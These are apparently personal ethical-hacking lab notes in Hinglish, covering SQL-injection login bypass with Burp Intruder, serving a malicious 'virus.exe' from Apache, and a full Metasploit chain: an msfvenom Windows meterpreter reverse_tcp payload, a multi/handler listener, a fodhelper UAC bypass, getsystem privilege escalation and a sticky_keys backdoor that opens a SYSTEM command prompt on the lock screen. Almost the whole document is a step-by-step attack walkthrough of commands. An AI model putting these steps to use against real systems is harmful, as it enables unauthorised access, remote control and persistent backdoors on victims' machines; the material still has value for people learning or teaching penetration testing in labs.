• Enter coloum to dump  = password  click ok —> send | Agar mujhe password dekhna rha ho  |
|  |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

| **Authentication Bypass** |  |
| https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md |  |
step 0] username me ' lagake check kro ki sql injection vulnerebility hai ya nahi. agar error aaye sql se related ya blank hojaye to error hai.
step 1]  login page pe admin/admin daalo. 
step 2] burp pe request ko accept kro.
step 3] us request ko intruder pe send kro.
step 4] target check kro. intruder pe
step 6] pojision pe jake sniper select kro.
step 7] payload entro point ko select kerke clear kro.
step 8] username me && ye sumbool add kro admin ko hata ke. aue password ko aise hi rhne do.
step 9] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md  .....yaha se authentacation bypass ka payload copy kro.
step 10] payload me jake paload opsion me past ker do 
step 11] start attack pe click kerdo. 
step 12] states code jo different aaye use copy ker lo.
step 13] use login page pe username pe past ker do. aur password me kuchh bhi daal do.
step 14] login hojao.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# File host on apache server

| Command  | Explain command  |
| --- | --- |
| Sudo service apache2 start | apache2 server start hojayega  |
| >ip a   or ipconfig   eth0 search browser to check apache page | ip address ko copy ker ke browser pe pest krege che its worrk or not |
| virus.exe | ek virus.exe name ka folder bataya |
| >sudo mv virus.exe  /var/www/html |  |
| >cd /var/www/html |  |
| ls  |  |
| >sudo mkdir shares |  |
| >sudo mv virus.exe shares |  |
| Go to the browser and search |  |
| Eth0 ip 192.169.1.2/share/virus.exe | search on vecteam and also attacker machine |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

2] method  
| step 1 :-  root user bano. |  |
| step2 :- run **cd** | jump to the root directory. |
| step3 :- **msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe**. | make payload using msfvemom. |
| step4 :- Run **mkdir /var/www/html/share** | To create a new directory after the location (/var/www/html) |
| step5 :- Run **chmod -R 755 /var/www/html/share** | permission diya share folder ko. |
| step6 :- Run **chown -R www-data:www-data /var/www/html/share** |  |
| step7 :- **cp /home/attacker/Desktop/Windows.exe /var/www/html/share/**  | jo hum payload creat kiye the use hum share folder me copy krayege. |
| step8 :- **service apache2 start** |  |
| step9 :-  Run **msfconsole** |  |
| step10 :- **use exploit/multi/handler** |  |
| step11 :- **set payload windows/meterpreter/reverse_tcp** |  |
| step12 :-**set lhost,set lport,run** |  |
| step13 :-switch to the **Windows 11** machine |  |
| step14 :-**http://10.10.1.13/share** and press **Enter** | search vecteam browser |
| step15 :-[ ] Click on **Windows.exe** to download the file. —→ Navigate to the **Downloads** folder and double-click the **Windows.exe** file —→ If an **Open File - Security** **Warning** window appears; click **Run**. |  |
| step16 :-to switch to the **Parrot Security** machine —→The Meterpreter session has successfully been opened. |  |
| step17 :-Type **sysinfo** and press **Enter —→ &** Type **getuid** and press **Enter** |  |
| step18 :-Type **background** and press **Enter** |  |
| step19 :-Type **search bypassuac** and press **Enter —→** type **use exploit/windows/local/bypassuac_fodhelper** and press **Enter**. |  |
| step20 :-Type **set session 1** and press **Enter**. —> Type **show options enter. —>** set the **LHOST,**[ ] To set the **TARGET** option, type **set TARGET 0** and press **Enter** —>[ ] To set the **TARGET** option, type **set TARGET 0** and press **Enter**  | exploit on **Windows 11** machine.

 |
| step21 :-Type **getsystem -t 1** and press **Enter** | to elevate privileges. |
| step22 :-type **getuid** and press **Enter** |  |
| step23 :- Type **background** and press **Enter** |  |
| step24 :-Type **use post/windows/manage/sticky_keys** and press **Enter**. —→Now type **sessions -i*** and press **Enter.** | —> list the sessions in meterpreter. |
| step25 :- type **set session 2 Press Enter. —→** type **exploit** and press **Enter** |  |
| step26 :-switch to **Windows 11** machine and sign out from the **Admin** account and sign into **Martin** |  |
| step27 :- Martin is a user account without any admin privileges, lock the system and from the lock screen press **Shift** key **5** times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window.
2. [ ] In the Command Prompt window, type **whoami** and press **Enter**. |  |




